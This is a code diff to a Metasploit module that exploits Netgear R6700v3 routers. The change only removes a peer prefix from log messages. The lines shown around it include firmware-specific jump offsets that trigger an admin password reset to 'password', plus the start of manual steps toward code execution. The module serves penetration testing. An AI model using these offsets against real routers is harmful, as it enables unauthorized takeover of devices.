@@ -113,12 +113,12 @@ class MetasploitModule < Msf::Auxiliary
   def find_offset
     target_version = retrieve_version
     if target_version == Rex::Version.new('1.0.4.84')
-      print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.")
+      print_status("Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.")
       # this offset is where execution will jump to
       # a part in the middle of the binary that resets the admin password
       return "\x58\x9a\x03"
     elsif target_version == Rex::Version.new('1.0.4.82')
-      print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.")
+      print_status("Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.")
       return "\x48\x9a\x03"
     end
   end
@@ -178,7 +178,7 @@ class MetasploitModule < Msf::Auxiliary
       # no response is received in case of success
       fail_with(Failure::UnexpectedReply, 'Failed to send HTTP payload... try again?')
     else
-      print_good("#{peer} - HTTP payload sent! 'admin' password has been reset to 'password'")
+      print_good("HTTP payload sent! 'admin' password has been reset to 'password'")
       print_status('To achieve code execution, do the following steps manually:')
       print_status("1- Login to #{rhost} with creds 'admin:password', then:")
       print_status("\t1.1- go to Advanced -> Administration -> Set Password")
